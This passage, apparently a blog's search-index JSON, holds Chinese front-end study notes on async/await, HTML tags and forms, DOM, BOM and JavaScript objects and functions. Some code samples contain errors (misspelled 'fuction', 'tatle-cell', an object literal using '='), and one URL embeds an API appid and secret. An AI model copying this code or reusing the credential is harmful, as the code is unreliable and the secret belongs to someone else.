weixue = await readWeiXue();    //获取插秧诗内容    let chayang = await readChaYangShi();    // 获取观书有感    let guanshu = await readGuanShu();    console.log(weixue.toString());    console.log(chayang.toString());    console.log(guanshu.toString());&#125;main();\n\n如何体现异步：只要有一个await语句后的promise对象是reject，那么整个async函数都会中断执行。\n\nasync和await结合发送AJAX请求\n// 发送 AJAX 请求, 返回的结果是 Promise 对象function sendAJAX(url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        //1. 创建对象        const x = new XMLHttpRequest();        //2. 初始化        x.open(&#x27;GET&#x27;, url);        //3. 发送        x.send();        //4. 事件绑定        x.onreadystatechange = function () &#123;            if (x.readyState === 4) &#123;                if (x.status &gt;= 200 &amp;&amp; x.status &lt; 300) &#123;                    //成功啦                    resolve(x.response);                &#125;else&#123;                    //如果失败                    reject(x.status);                &#125;            &#125;        &#125;    &#125;)&#125;//promise then 方法测试// sendAJAX(&quot;https://api.apiopen.top/getJoke&quot;).then(value=&gt;&#123;//     console.log(value);// &#125;, reason=&gt;&#123;&#125;)// async 与 await 测试 async function main()&#123;    //发送 AJAX 请求    let result = await sendAJAX(&quot;https://api.apiopen.top/getJoke&quot;);    //再次测试    let tianqi = await sendAJAX(&#x27;https://www.tianqiapi.com/api/?version=v1&amp;city=%E5%8C%97%E4%BA%AC&amp;appid=23941491&amp;appsecret=TXoD5e8P&#x27;)    console.log(tianqi);&#125;main();\n\n对象方法扩展\nObject.values\nObject.entries\nObject.getOwnPropertyDescriptor 返回对象属性的描述对象\n\n&lt;script&gt;    const school = &#123;        name:&#x27;尚硅谷&#x27;,        cities:[&#x27;北京&#x27;,&#x27;上海&#x27;,&#x27;深圳&#x27;],        xueke:[&#x27;前端&#x27;,&#x27;Java&#x27;,&#x27;大数据&#x27;,&#x27;运维&#x27;]    &#125;;    //获取对象所有的键    console.log(Object.keys(school));    //获取对象所有的值    console.log(Object.values(school));    //entries,用来创建map    console.log(Object.entries(school));    console.log(new Map(Object.entries(school)))    //对象属性的描述对象（用于深层次的对象克隆）    console.log(Object.getOwnPropertyDescriptor(school))        const obj = Object.create(null,&#123;        name:&#123;            value:&#x27;尚硅谷&#x27;,            //属性特性            writable:true,            configurable:true,            enumerable:true,        &#125;    &#125;)&lt;/script&gt;\n\n","categories":["ES6"],"tags":["ES8"]},{"title":"HTML基础（一）：meta标签","url":"/2022/02/26/HTML%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Ameta%E6%A0%87%E7%AD%BE/","content":"格式&lt;head&gt;    &lt;meta&gt;&lt;/head&gt;\n\n作用设置网页中的元数据，用于浏览器渲染网页，元数据对用户是不可见的。\n\ncharset：指定网页的字符集编码\n&lt;meta charset=&quot;UTF-8&quot;&gt;\n\nname：指定的数据的名称\n\nkeywords：网页的关键字，搜索引擎的搜索关键词\n&lt;meta name=&quot;keywords&quot; content=&quot;网上购物,网上商城,家电,手机,电脑,服装,居家,母婴,美妆,个护,食品,生鲜,京东&quot;&gt;\n\ndescription：网页的描述，搜索结果简介\n&lt;meta name=&quot;description&quot; content=&quot;京东JD.COM-专业的综合网上购物商城，为您提供正品低价的购物选择、优质便捷的服务体验。商品来自全球数十万品牌商家，囊括家电、手机、电脑、服装、居家、母婴、美妆、个护、食品、生鲜等丰富品类，满足各种购物需求。&quot;/&gt;\n\n\n\nviewport：设置视口大小（为适配移动端）\n&lt;!--设置的是css像素，与物理像素区分--&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width:100px&quot;&gt;\n\n\n完美视口：\n每一款移动设备设计时，都会有一个最佳像素比（ css像素&#x2F;物理像素）。设置视口width，使之与物理像素的像素比为该值，即可得到最佳效果\n\n不同移动设备的完美视口不同：\n\n\n&lt;!--将网页的视口设置为完美视口--&gt;&lt;!--利用device-width设置视口大小--&gt;&lt;!--initial-scale=1.0，防止横竖屏切换混乱--&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width，initial-scale=1.0&quot;&gt;\n\n\ncontent：指定的数据的内容\n\nhttp-equiv：将页面重定向到另一个网站\n&lt;!--三秒后跳转到百度--&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;3;url=https://www.baidu.com&quot;&gt;\n\n","categories":["HTML"],"tags":["移动端","HTML","meta"]},{"title":"HTML基础（三）：表格","url":"/2022/03/05/HTML%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E8%A1%A8%E6%A0%BC/","content":"\n基本格式：\n&lt;!--创建表格--&gt;&lt;table&gt;     &lt;!--行--&gt;    &lt;tr&gt;        &lt;!--列（单元格）--&gt;        &lt;td&gt;&lt;/td&gt;        &lt;td&gt;&lt;/td&gt;        &lt;td&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;!--行--&gt;    &lt;tr&gt;        &lt;!--列（单元格）--&gt;        &lt;td&gt;&lt;/td&gt;        &lt;td&gt;&lt;/td&gt;        &lt;td&gt;&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;\n\n属性：\n\ncolspan 横向合并单元格\nrowspan 纵向合并单元格\n\n\n注：\n\ntr不是table的子元素：如果表格中没有使用tbody，而是直接使用tr，那么刘阿龙年起会自动创建一个tbody，并且将tr全部放到tbody。\n\n\n\n长表格\n格式：\n&lt;!--创建长表格\t头部 thead\t主题 tbody\t底部 tfoot\t三者顺序调换时不改变结构--&gt;&lt;table&gt;     &lt;thead&gt;        &lt;tr&gt;            &lt;!--头部加粗--&gt;            &lt;th&gt;&lt;/th&gt;            &lt;th&gt;&lt;/th&gt;            &lt;th&gt;&lt;/th&gt;        &lt;/tr&gt;    &lt;/thead&gt;    &lt;tbody&gt;        &lt;tr&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;        &lt;/tr&gt;    &lt;/tbody&gt;    &lt;tfoot&gt;        &lt;tr&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;            &lt;td&gt;&lt;/td&gt;        &lt;/tr&gt;    &lt;/tfoot&gt;&lt;/table&gt;\n\n表格的样式\nborder-spacing 指定边框之间的距离\n\nborder-collapse：collapse 设置边框的合并\n\n不同行不同颜色：\ntr:nth-child(odd)&#123;    background-color:#bfa;&#125;\n\nvertical-align 指定元素垂直方向位置\n\nmiddle 默认情况下元素在td中是垂直居中的\n\n可利用以上特性，将div转换为单元格进行垂直居中\n示例：\n&lt;div class=&quot;box1&quot;&gt;    &lt;div class=&quot;box2&quot;&gt;    &lt;/div&gt;&lt;/div&gt;\n\n.box1&#123;    width:300px;    height:300px;    background-color:orange;    /*将元素设置为单元格*/    display:tatle-cell;    vertical-align:middle;/*子元素垂直居中*/&#125;.box2&#123;    width:100px;    height:100px;    background-color:yellow;    /*水平居中*/    margin:0 auto;&#125;\n\n\n\n","categories":["HTML"],"tags":["HTML","表格"]},{"title":"HTML基础（二）：相对路径","url":"/2022/02/26/HTML%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84/","content":"含义​    .&#x2F; 表示当前文件所在的目录，可省略不写\n&lt;!--两者都指的是当前目录下的target文件--&gt;&lt;a href=&quot;./target.html&quot;&gt;&lt;/a&gt;&lt;a href=&quot;target.html&quot;&gt;&lt;/a&gt;\n\n​    ..&#x2F; 表示当前文件所在的目录的上一级目录，可多次使用\n&lt;!--指的是当前目录的上一级目录下的target文件--&gt;&lt;a href=&quot;../target.html&quot;&gt;&lt;/a&gt;&lt;!--指的是当前目录的上两级目录下的target文件--&gt;&lt;a href=&quot;../../target.html&quot;&gt;&lt;/a&gt;\n","categories":["HTML"],"tags":["HTML","路径"]},{"title":"JS基础（一）：基本语法","url":"/2022/03/08/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","content":"编写位置\nonclick属性中\n&lt;button onclick=&quot;alert(&#x27;xxxxxxxxx&#x27;);&quot;&gt;&lt;/button&gt;\n\nhref属性中\n&lt;a href=&quot;javascript:alert(&#x27;xxxxxxxxx&#x27;);&quot;&gt;&lt;/a&gt;\n\nscript标签中\n&lt;script type=&quot;text/javascript&quot;&gt;    alert(&#x27;警告窗口&#x27;);    document.write(&quot;在页面输出一个内容&quot;);    console.log(&quot;向控制台输出一个内容&quot;);&lt;/script&gt;\n\n外部js文件中\n&lt;script type=&quot;text/javascript&quot; src=&quot;js/script.js&quot;&gt;&lt;/script&gt;&lt;!--script标签一旦用于引入外部文件，其内部就不能再写代码了--&gt;\n\n基本语法\n声明变量：var a;\n声明+赋值：var a &#x3D; 0;\n\n标识符：自主命名的（如变量名、函数名、属性名）\n\n命名规则：\n标识符中可含有字母、数字、_、$\n标识符不能以数字开头\n标识符不能是ES中的关键字或保留字\n标识符一般次啊用驼峰命名法\n首字母小写，每个单词开头字母大写，其余字母小写\n\n\n\n\n\n\n字符串：双引号或单引号都可以，但不要混用\n\ntypeof检查变量类型\nconsole.log(typeof a);\n\nNumber类型\n\nNumber.MAX_VALUE 最大值\nNumber.MIN_VALUE 最小正值\nInfinity 正无穷\n-Infinity 负无穷\nNaN 特殊数字，表示Not A Number\n\n\n\nNull类型\n\n表示空对象\ntypeof检查null时，返回object\n\n\nUndefined类型\n\n当声明一个变量，但没有给它负值时，它的值为undefined\n\n\n强制类型转换\n\n将其它数据类型转换为String\n\ntoString()    注：null和undefined没有此方法\n调用String()函数   注：null和undefined可用此方法\n\n\n将其它数据类型转换为Number\n\n调用Number()函数\n\n字符串 –&gt; 数字\n纯数字字符串 - 数字\n存在非数字 - NaN\n空串或全空格 - 0\n\n布尔 –&gt; 数字\ntrue - 1\nflase -0\n\nnull –&gt; 数字 0\n\nundefined –&gt; 数字 0\n\n\n\n调用parseInt()函数  将字符串转换为一个整数：\n​    可将字符串中有效的整数取出（即存在非数字也可以）\n​    在parseInt()中传递第二个参数，来指定数字的进制\n调用parseFloat()函数  将字符串转换为一个浮点数：\n​    可将字符串中有效的小数取出（即存在非数字也可以）\n若对非String使用以上函数，则先将其转换为String再操作\n\n\n\n将其它数据类型转换为Boolean\n\n调用Boolean()函数\n\n数字 –&gt; 布尔\n除了0和NaN，其余都是true\n\n字符串 –&gt; 布尔\n除了空串，其余都是true\n\nnull和undefined都会转为false\n\n对象也会转换为true\n\n\n\n对任意数据类型做两次非运算\n\n\n\n\n\n逻辑运算符\n\n！非   &amp;&amp;与  ||或\n\n\n\n","categories":["JavaScript"],"tags":["JS"]},{"title":"HTML基础（四）：表单","url":"/2022/03/05/HTML%E5%9F%BA%E7%A1%80%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E8%A1%A8%E5%8D%95/","content":"\n表单用于将本地的数据提交给服务器\n\n\nform 创建表单\n\n属性：\n\naction 提交的服务器地址\n\n\n表单项：\n\ninput （自结束标签）\n\ntype&#x3D;”text” 文本框\n数据要提交服务器，必须为元素指定name值（相当于变量）\nname&#x3D;”username”\nvalue&#x3D;”xxx” 默认值\nautocomplete&#x3D;”off” 自动补全（可直接放在form属性中）\nrendonly 将表单项设置为只读，数据会提交\ndisable 将表单项设置为禁用，数据不会提交\nautofucus 自动获取焦点，刷新时光标出现\n\ntype&#x3D;”password” 密码框\nname&#x3D;”userpsword”\n\ntype&#x3D;”radio” 单选按钮（选择框）\nname&#x3D;”hello”\n&lt;input type=&quot;radio&quot; name=&quot;hello&quot; value=&quot;a&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;hello&quot; value=&quot;b&quot; checked&gt;&lt;!--有相同属性name才能单选--&gt;\n\nvalue&#x3D;”a” 指定选择的值（相当于变量值，选择哪个提交时hello就等于哪个值）\nchecked 默认选中\n\ntype&#x3D;”checkbox” 多选按钮（选择框）\n同上\n\ntype&#x3D;”color” 调色板\n\ntype&#x3D;”email” 邮箱、type&#x3D;”tel”手机号 （在移动端比较好用）\n提供提示，一般用js代替此效果\n\ntype&#x3D;”submit”  提交按钮\nvalue&#x3D;”按钮显示名字”\n\ntype&#x3D;”reset” 重置按钮\n将内容改成默认值\n\ntype&#x3D;”button”  普通按钮\n结合js完成提交\n\n\n\nbutton 按钮 （成对标签，可在中间放图片，把图片当作按钮）\n\ntype&#x3D;”submit” 提交按钮\ntype&#x3D;”reset” 重置按钮\ntype&#x3D;”button” 普通按钮\n\n\nselect 下拉列表 \n&lt;select name=&quot;haha&quot;&gt;    &lt;option value=&quot;i&quot;&gt;&lt;/option&gt;    &lt;option selected value=&quot;ii&quot;&gt;&lt;/option&gt;    &lt;option value=&quot;iii&quot;&gt;&lt;/option&gt;&lt;/select&gt;&lt;!--选择哪个提交时hello就等于哪个值--&gt;\n\nselected 默认选中\n\n\n\n\n\n\n","categories":["HTML"],"tags":["HTML","表单"]},{"title":"JS基础（七）：DOM","url":"/2022/03/09/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9ADOM/","content":"DOM简介\nDOM，全称Document Object Model 文档对象模型\nJS中通过DOM来对HTML文档进行操作\n\n&lt;button id=&quot;btn&quot;&gt;我是一个按钮&lt;/button&gt;&lt;script type=&quot;text/javascript&quot;&gt;    //获取网页中的button对象：    var btn = document.getElementById(&quot;btn&quot;);    //修改按钮中的文字：    btn.innerHTML = &quot;I&#x27;m Button&quot;;&lt;/script&gt;\n\n事件\n可以为按钮的对应事件绑定处理函数的形式来响应事件\n当事件被触发时，对应函数将会被调用\n\n&lt;button id=&quot;btn&quot;&gt;我是一个按钮&lt;/button&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var btn = document.getElementById(&quot;btn&quot;);    //绑定一个单击事件（单击响应函数）    btn.onclick = function()&#123;        alert(&quot;xxxxxxx&quot;);    &#125;;&lt;/script&gt;\n\n\nonload事件\n为window绑定一个onload事件，该事件对应的响应函数将会在页面加载完成之后执行，确保代码执行时所有的DOM对象已经加载完毕\nwindow.onload = function()&#123;    var btn = document.getElementById(&quot;btn&quot;);    //绑定一个单击事件（单击响应函数）    btn.onclick = function()&#123;        alert(&quot;xxxxxxx&quot;);    &#125;;&#125;;\n\nDOM查询\n获取元素节点\n\n通过document对象调用\n\ngetElementById()：通过id属性获取一个元素节点对象\n\ngetElementsByTagName()：通过标签名获取一组元素节点对象，返回类数组对象\n\ngetElementsByName()：通过name属性获取一组元素节点对象\n\ngetElementsByClassName()：通过class属性获取一组元素节点对象\nIE8不兼容\n\nbody：属性，获取body标签对象\n\ndocumentElement：属性，获取html标签对象\n\nall：属性，获取所有元素\n\nquerySelector()：根据CSS选择器（作为参数）来查询一个元素节点对象\n//获取box1类下的divvar div = document.querySelector(&quot;.box1 div&quot;);\n\n局限：使用该方法总会返回唯一一个元素，如果满足条件的有多个元素，只会返回第一个\n\nquerySelectorAll()：根据CSS选择器（作为参数）来查询一组元素节点对象，会将结果封装进数组（即使一个结果也会）\n\n\n\n通过具体元的元素节点调用\n\ngetElementById()：方法，返回当前节点的指定标签名后代节点\n\nchildNodes：属性，表示当前节点的所有子节点\n该属性会获取包括文本节点（包括标签间的空白、换行）在内的所有节点\n注：在IE8及以下浏览器中不会将空白文本当成子节点\n\nchildren：属性，表示当前节点的所有子元素（标签）\n\nfirstChild：属性，表示当前节点的第一个子节点（包括空白文本）\n\nfirstElementChild：属性，表示当前节点的第一个子元素\n兼容性不高\n\nlastChild：属性，表示当前节点的最后一个子节点\n\n\n\n通过具体的节点调用\n\nparentNode：属性，表示当前节点的父节点\npreviousSibling：属性，表示当前节点的前一个兄弟节点（包括空白文本）\npreviousElementSibling：属性，表示当前节点的前一个兄弟元素\nnextSibling：属性，表示当前节点的后一个兄弟节点\n\n\n\n\ninnerHTML：用于获取元素内部的HTML代码\n对于自结束标签没有意义\ninnerText：用于获取元素内部的文本内容（自动将标签去除）\n\n获取元素节点的属性\n直接使用  元素.属性名\neg. 元素.id 元素.name 元素.value\n注：读取class属性时要用 元素.className\n\n\nDOM的增删改\ncreateElement()：创建一个元素节点对象，需要一个标签名作为参数\n\ncreateTextNode()：创建一个文本节点对象，需要一个文本内容作为参数\n\nappendChild()：向一个父节点中添加一个新的子节点\n语法：父节点.appendChild(子节点)；\n另一种方式：父节点.innerHTML +&#x3D; “文本”；\n\ninsertBefore()：在指定的子节点前插入新子节点\n语法：父节点.insertBefore(新节点，旧节点)；\n\nreplaceChild()：使用指定子节点替换已有子节点\n语法：父节点.replaceChild(新节点，旧节点)；\n\nremoveChild()：删除一个子节点\n语法：父节点.removeChild(子节点)；\n常用：子节点.parentNode.removeChild(子节点)；\n\n\nDOM访问元素样式\n修改样式（内联样式）\n语法：元素.style.样式名 &#x3D; 样式值 \n注意：若CSS样式名中含有减号-，则将该样式名改为驼峰命名法（去掉-，将-后的字母大写）\nbox1.style.width=&quot;300px&quot;;box1.style.backgroundColor=&quot;yellow&quot;;\n\n获取元素样式（内联样式）\n语法：元素.style.样式名\n只能读取内联样式，无法读取样式表中的样式\n\n获取元素样式（当前显示的样式，包括内联+样式表）\n\n语法：元素.currentStyle.样式名\n谁生效旧获取谁，如果当前元素没有设置该样式，则返回它的默认值\n缺点：只有IE支持，其它浏览器都不支持，且通过此方法读取的样式只读。\n\n语法：getComputedStyle()  可直接使用\n​            参数1：要获取的元素\n​            参数2：可以传递一个伪元素，一般为null\n该方法会返回一个对象，对象中封装了当前元素对应的样式\nvar obj = getComputedStyle(box1,null);alert(obj.width);\n\n若获取的样式没有设置，则会获取到真实的值，而不是默认值。如没有设置width，它不会返回auto，而是一个数值。\n缺点：IE8不支持，且通过此方法读取的样式只读。\n\n自定义函数，获取指定元素的当前的样式\n参数：obj 要获取样式的元素，name 要获取的样式名\nfunction getStyle(obj,name)&#123;        if(window.getComputedStyle)&#123;        //正常浏览器的方式        return getComputedStyle(obj,null)[name];    &#125;else&#123;        //IE8的方式    \treturn obj.currentStyle[name];    &#125;&#125;\n\n\nclientWidth 属性，获取元素可见宽度（包括内容区和内边距）\nclientHeight 属性，获取元素可见高度（包括内容区和内边距）\n返回值不带单位，均为数字，可直接进行计算，只读不可修改\n\noffsetWidth 属性，获取元素整个宽度 （包括内容区、内边距和边框）\noffsetHeight 属性，获取元素整个高度 （包括内容区、内边距和边框）\n\noffsetParent 属性，获取元素的定位父元素\n获取到里当前元素最近的开启了定位的祖先元素，若所有祖先元素都没开启定位，则返回body\n\noffsetLeft 元素相对于其定位父元素的水平偏移量\noffsetTop 元素相对于其定位父元素的垂直偏移量\n\n\n","categories":["JavaScript"],"tags":["JS","DOM","事件"]},{"title":"JS基础（三）：this和arguments","url":"/2022/03/09/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9Athis%E5%92%8Carguments/","content":"\n在调用函数时，浏览器每次都会传递进两个隐含的参数：\n\n函数的上下文对象this\n封装实参的对象arguments\n\n\nthis\n解析器在调用函数每次都会向函数内部传递进一个隐含的参数，\n这个隐含的参数就是this，this指向的是一个对象，这个对象称为函数执行的上下文对象\n\n\n任何函数本质上都是通过某个对象来调用的\n所有函数内部都有一个变量this\n它的值是调用函数的当前对象\n\n根据函数的调用方式的不同，this会指向不同的对象。\n\n以函数的形式调用时（没有指定对象），this永远都是window\nPerson()   //this是windowvar test = p.setColortest()   //this是windowfunction fun1()&#123;    function fun2()&#123;        console.log(this)    &#125;    fun2()&#125;fun1()     //this是window\n\n以方法的形式调用时，this就是调用方法的那个对象\np.getColor() //this是p\n\n以构造函数的形式调用时，this就是新创建的那个对象\nvar p = new Person() //this是p\n\n以call()和apply()调用时，this是第一个参数指定的那个对象（通过此方法修改this）\nvar obj = &#123;&#125;p.setColor.call(obj,&quot;black&quot;) //this是obj\n\narguments\narguments是一个类数组对象，它也可以通过索引来操作数组，也可获取长度\n在调用函数时，所传递的实参都会在arguments中保存\n因此，即使不定义形参，也可以通过arguments来使用实参\n\n\narguments.length 获取实参的长度\n\narguments[0] 第一个实参\narguments[1] 第二个实参….\n\narguments.callee 该属性对应一个函数对象，即当前正在指向的函数的对象\n\n\n","categories":["JavaScript"],"tags":["JS","this","arguments"]},{"title":"JS基础（九）：BOM","url":"/2022/03/11/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9ABOM/","content":"BOM简介\nBOM，浏览器对象模型，BOM可以让我们通过JS来操作浏览器\n在BOM中提供了一组对象，用来完成对浏览器的操作\n\n\nBOM对象：\n\nWindow\n\n代表整个浏览器的窗口，同时window也是网页中的全局对象\n\n\nNavigator\n\n代表当前浏览器信息，通过该对象可识别不同浏览器\n由于历史原因，Navigator中的大部分属性都已经无法帮助我们识别浏览器了\n一般使用userAgent来判断浏览器的信息\n\n\nLocation\n\n代表当前浏览器的地址栏信息，通过该对象可操作浏览器跳转页面\n\nassign() 跳转到其它页面，作用和直接修改location一样\n\nreload() 重新加载当前页面，作用和刷新按钮一样\n若在方法中传递true作为参数，则会强制情况缓存刷新界面\n\nreplace() 跳转到其它页面，不会生成历史记录，不能使用回退按钮\n\n\n\nHistory\n\n代表浏览器的历史记录\n由于隐私原因，该对象不能获取到具体的历史记录，只能操作浏览器向前翻页或向后翻页，且该操作只在档次访问时有效\nlength属性，获取到当前访问的链接数量\nback() 回退到上一个页面\nforward() 跳转下一个页面\ngo() 跳转到指定页面，需要整数作为参数\n\n\nScreen\n\n代表用户的屏幕的信息，通过该对象可以获取到用户的显示器的相关的信息\n\n\n\n\nBOM对象在浏览器中都是作为window对象的属性保存的，可通过window对象来使用，也可以直接使用\n\n\n\n","categories":["JavaScript"],"tags":["JS","BOM"]},{"title":"JS基础（二）：对象和函数","url":"/2022/03/08/JS%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%AF%B9%E8%B1%A1%E5%92%8C%E5%87%BD%E6%95%B0/","content":"对象什么是对象？\n多个数据的封装体\n用来保存多个数据的容器\n一个对象代表现实中的一个事物\n\n为什么要用对象？\n统一管理多个数据\n\n对象的组成\n属性：属性名（字符串，允许不写引号）和属性值（任意数据类型）组成\n方法：一种特别的属性（属性值是函数）\n\n如何访问对象的内部数据？\n.属性名 常用，但有时不能用\n\n[&#39;属性名&#39;]  不常用，但任何情况下都能用\n\n什么时候必须用[&#39;属性名&#39;] \n\n属性名包含特殊字符：- 空格\n属性名不确定\n\nvar p=&#123;&#125;//1.给p对象添加一个属性：content-type:text/jsonp[&#x27;content-type&#x27;]=&#x27;text/json&#x27;console.log(p[&#x27;content-type&#x27;])//2.属性名不确定var propName = &#x27;myAge&#x27;var valve = 18// p.propNa = value //不能用p[propName] = valueconsole.log(p[propName])\n\n\n\n对象的分类内建对象\n由ES标准定义的对象，在任何的ES的实现中都可以使用\n比如Date、Math、String、Number、Boolean、Function、Object……\n\n宿主对象\n由JS的运行环境提供的对象，目前来说主要指由浏览器提供的对象\n比如BOM、DOM（一组对象）\n\n自定义对象\n由开发任意自己创建的对象\n\n\n创建对象\n\nvar obj &#x3D;  new Object();\n\nvar obj &#x3D; {\n​    name:”猪八戒”,\n​    age:28,\n​    test:{name:”沙和尚”}\n};\n\n\n\n添加属性\n\nobj.name &#x3D; “孙悟空”;\n\n属性值可以是任何数据类型，也可是函数（即对象的方法）\nobj.sayName &#x3D; function(){\n​        console.log(obj.name)；\n};\n调用对象的方法：obj.sayName();\n\n\n\n删除属性\n\ndelete obj.name;\n\n\nin 运算符：可检查一个对象中是否由指定的属性\n语法：”属性名” in 对象\n示例：console.log(“name” in obj);\n\nfor … in 语句：枚举对象中的属性\n语法：for(var 变量 in 对象) {  }\n示例：for(var n in obj){\n​                    console.log(“属性名：”+n);\n​                    console.log(“属性值：”+obj[n]);\n​            }\n\n\n函数什么是函数？\n函数也是一种对象\n\n\n函数：具有特定功能的n条语句的封装体\n只有函数是可以执行的，其它类型的数据不能执行\n\n为什么要用函数？\n提高代码复用\n便于阅读交流\n\n如何定义函数？\n创建函数\n\nvar fun &#x3D; new Function()  少用\n\n使用函数声明：\nfunction 函数名([形参1，形参2…形参N]){\n​        语句…\n}\n最后不用写分号\n函数内部还可以在声明函数\n\n使用函数表达式：（var 函数名 &#x3D; 匿名函数）\nvar 函数名 &#x3D; function([形参1，形参2…形参N]){\n​        语句…\n}；\n注意结尾要写分号\n\n\n\n形参与实参\n\n声明形参相当于在函数内部声明了对于变量，但是没有赋值\n\n调用时指定实参，实参会赋值给函数中对应的形参\nfunction sum(a,b)&#123;    console.log(a+b);&#125;sum(1,2);\n\n调用函数时解析器不会检查实参类型、数量\n\n实参可以是一个对象，也可以是一个函数\nfunction sayHello(o)&#123;    console.log(&quot;我是&quot;+o.name);&#125;function fun(a)&#123;    a(obj);&#125;fun(sayHello);\n\n形参为匿名函数 (在开发中常见)\nfunction fun(a)&#123;    a(obj);&#125;fun(function()&#123;alert(&quot;hello&quot;)&#125;);\n\n\n返回值\n\nreturn xxx；\n可以是任意的数据类型，也可以是对象，也可以是函数\n\n\n\n如何调用（执行）函数？\ntest()：直接调用\n\nobj.test()：通过对象调用\n\nnew test()：new调用\n\ntest.call(obj)&#x2F;apply(obj)：相当于obj.test()，可以让一个函数成为指定任意对象的方法进行调用\nvar obj = &#123;&#125;function test()&#123;\tthis.xxx = &#x27;atguigu&#x27;&#125;//相当于obj.test() 不能直接调用，根本就没有test.call(obj)   //相当于obj.test()console.log(obj.xxx) //&#x27;atguigu&#x27;\n\n回调函数什么函数是回调函数？\n自己定义的、自己没有调用、但最终执行了（某个时刻或某个条件下）\n\n常见的回调函数\ndom事件回调函数（this是发生事件的dom元素）\ndocument.getElement(&#x27;btn&#x27;).onclick = function()&#123;    alert(this.innerHTML)&#125;\n\n定时器回调函数（this是window）\n//超时定时器、循环定时器setTimeout(function()&#123;    alert(&#x27;到点了&#x27;)&#125;,2000)\n\najax请求回调函数\n\n生命周期回调函数\n\n\n立即执行函数（IIFE，Immediately-Invoked Function Expression）\n立即执行函数：函数定义完，立即被调用（别名：匿名函数自调用）\n立即执行函数往往只会执行一次\n\n//直接这样写会报错function()&#123;\talert(&quot;我是一个匿名函数&quot;);&#125;//加括号表示它是一个整体，则不会报错，但不会执行(function()&#123;\talert(&quot;我是一个匿名函数&quot;);&#125;)//立即执行函数(function()&#123;\talert(&quot;我是一个匿名函数&quot;);&#125;)();//立即执行函数（带参数）(function()&#123;\tconsole.log(&quot;a=&quot;+a);    console.log(&quot;b=&quot;+b);&#125;)();\n\n\n作用：\n\n隐藏实现\n\n不会污染外部（全局）命名空间\n\n用它来编写js模块\n(function ()&#123;    var a = 3    console.log(a+3)&#125;)()var a = 4console.log(a);(function ()&#123;    var a = 1    function test()&#123;        console.log(++a)    &#125;    window.$ = function()&#123;        return &#123;            test:test        &#125;    &#125;&#125;)()$().test() //2\n\n\n\n作用域\n作用域：指一个变量的作用范围\n在JS中一共有两种作用域：全局作用域、函数作用域\n\n全局作用域\n直接在script标签中的JS代码，都在全局作用域\n全局作用域在打开时创建，在页面关闭时销毁\n全局作用域中有一个全局对象window，它代表浏览器的窗口\n在全局作用域中：\n​    创建的变量都会作为window对象的属性保存\n​    创建的函数都会作为window对象的方法保存\n\n函数作用域\n调用函数时创建函数作用域，函数执行完毕后函数作用域销毁\n每调用一次函数就会创建一个新的函数作用域，它们之间是相互独立的\n在函数作用域中要访问同名的全局作用域属性a，可用window.a\n\n对象创建模式使用Object构造函数创建对象\n套路：先创建空Object对象，再动态添加属性&#x2F;方法\n适用场景：起始时不确定对象内部数据\n问题：语句太多（使用对象字面量模式解决）\n\nvar p = new Object()p.name = &#x27;Tom&#x27;p.age = 12p.setName = function(name)&#123;    this.name = name&#125;\n\n使用对象字面量创建对象\n套路：使用{}创建对象，同时指定属性&#x2F;方法\n适用场景：起始时对象内部数据是确定的\n问题：如果创建多个对象，有重复代码（使用工厂模式解决）\n\nvar p = &#123;    name = &#x27;Tom&#x27;    age = 12    setName = function(name)&#123;        this.name = name    &#125;&#125;\n\n使用工厂方法创建对象\n批量创建对象\n\n\n套路：通过工厂函数创建对象并返回\n适用场景：需要创建多个对象\n问题：对象没有一个具体的类型，都是Object类型（使用自定义构造函数解决）\n\nfuction createPerson(name, age, gender)&#123;    var obj = new Object();        obj.name = name;    obj.age = age;    obj.gender = gender;    obj.sayName = function()&#123;        alert(this.name);    &#125;;        return obj;&#125;var obj1 = createPerson(&quot;孙悟空&quot;,18,&quot;男&quot;);var obj2 = createPerson(&quot;猪八戒&quot;,28,&quot;男&quot;);\n\n\n使用工厂方法创建的对象，使用的构造函数都是Object，所创建的对象都是Object类型，导致无法区分出多种不同类型的对象\n\n使用自定义构造函数创建对象\n套路：自定义构造函数，通过new创建对象\n适用场景：需要创建多个类型确定的对象\n问题：每个兑现都有相同的数据，浪费内存（使用构造函数+原型解决）\n\n\n构造函数和普通函数的区别就调用方式的不同\n普通函数直接调用，构造函数需要使用new关键词调用\n构造函数执行流程：\n​    1.立刻创建一个新的对象\n​    2.将新建的对象设置为函数中的this，在构造函数中可以使用this来引用新建的对象\n​    3.逐行执行函数中的代码\n​    4.将新建的对象作为返回值返回\n\nfunction Person(name, age, gender)&#123;    this.name = name;    this.age = age;    this.gender = gender;    this.sayName = function()&#123;        alert(this.name);    &#125;;&#125;var per = new Person(&quot;孙悟空&quot;,18,&quot;男&quot;);function Dog(name, 